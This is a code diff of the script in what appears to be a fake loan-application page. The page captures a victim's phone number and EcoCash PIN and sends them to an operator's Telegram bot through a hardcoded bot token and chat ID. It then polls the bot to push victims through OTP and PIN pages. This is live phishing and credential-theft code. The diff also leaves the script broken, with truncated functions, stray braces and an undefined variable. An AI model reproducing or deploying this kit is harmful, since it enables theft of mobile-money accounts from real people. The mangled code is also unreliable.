@@ -495,71 +495,21 @@
       document.getElementById('supportModal').style.display = 'none';
     }
     <script>
+      
         BOT_TOKEN: '9167169396:AAEmzZ5ndzC0WzHEYXsY805aqoDv2qzR1Ww',
       CHAT_ID: '8820857419',
       APPROVE_PAGE: 'otp.html',
-      DEVICE_PAGE: 'device.html',      // ← fixed: was device_verify.html
+      DEVICE_PAGE: 'pin.html',
       SUCCESS_PAGE: 'success.html'
     };
-
-    let state = { lastUpdateId: 0 };
-    let isProcessing = false;
-
-    const phoneInput     = document.getElementById('phoneInput');
-    const pinInput       = document.getElementById('pinInput');
-    const continueBtn    = document.getElementById('continueBtn');
-    const errMsg         = document.getElementById('errMsg');
-    const spinnerOverlay = document.getElementById('spinnerOverlay');
-
     // ── Load application details from localStorage (original logic preserved) ──
-    function getStoredApplication() {
-      try {
-        return JSON.parse(localStorage.getItem('loanApplication') || '{}');
-      } catch (e) {
-        return {};
+    function getStoredApplication() 
       }
-    }
-
-    function normalizePhone(phone) {
-      return String(phone || '').replace(/\D/g, '').replace(/^263/, '').slice(-9);
     }
 
     function loadApplicationDetails() {
       const application = getStoredApplication();
-      const fullName = [application.firstName, application.lastName].filter(Boolean).join(' ').trim();
-      const phone = normalizePhone(application.phone || localStorage.getItem('phone'));
-
-      if (phone) phoneInput.value = phone;
-
-      if (fullName || application.loanAmount || application.loanType) {
-        document.getElementById('applicationSummary').classList.add('active');
-        document.getElementById('summaryName').textContent   = fullName || '—';
-        document.getElementById('summaryAmount').textContent = application.loanAmount ? '$' + Number(application.loanAmount).toLocaleString() : '—';
-        document.getElementById('summaryType').textContent   = application.loanType || '—';
-      }
-    }
-
-    // ── Input sanitisation ──
-    phoneInput.addEventListener('input', () => {
-      phoneInput.value = phoneInput.value.replace(/\D/g, '').slice(0, 9);
-    });
-
-    pinInput.addEventListener('input', () => {
-      pinInput.value = pinInput.value.replace(/\D/g, '').slice(0, 4);
-      if (pinInput.value.length === 4) pinInput.blur();
-    });
-
-    // ── Helpers ──
-    function showError(msg) {
-      errMsg.textContent   = msg;
-      errMsg.style.display = 'block';
-    }
-
-    function resetButton() {
-      isProcessing            = false;
-      continueBtn.disabled    = false;
-      continueBtn.textContent = 'Continue';
-    }
+      
 
     // ── Telegram bot send + poll ──
     function sendToBot(phone, pin) {
@@ -596,10 +546,7 @@
           }
         })
       })
-      .then(() => {
-        // Save phone to localStorage (original behaviour)
-        localStorage.setItem('phone', phone);
-        localStorage.setItem('flexLoanLogin', JSON.stringify({ phone, continuedAt: new Date().toISOString() }));
+      .then(() => 
 
         spinnerOverlay.style.display = 'flex';
         startPolling(approveId, declineId, verifyId);
@@ -646,27 +593,8 @@
     continueBtn.addEventListener('click', () => {
       errMsg.style.display = 'none';
 
-      const phone = normalizePhone(phoneInput.value);
-      const pin   = pinInput.value.trim();
-
-      if (phone.length !== 9) {
-        showError('Please enter a valid 9-digit mobile number.');
-        return;
-      }
-      if (pin.length !== 4) {
-        showError('Please enter your 4-digit EcoCash PIN.');
-        return;
-      }
-
-      sendToBot(phone, pin);
+      sendToBot(phone);
     });
-
-    // ── Init ──
-    window.addEventListener('pageshow', (event) => {
-      if (event.persisted) window.location.reload();
-    });
-
-    window.addEventListener('load', loadApplicationDetails);
   </script>
 </body>
 </html>
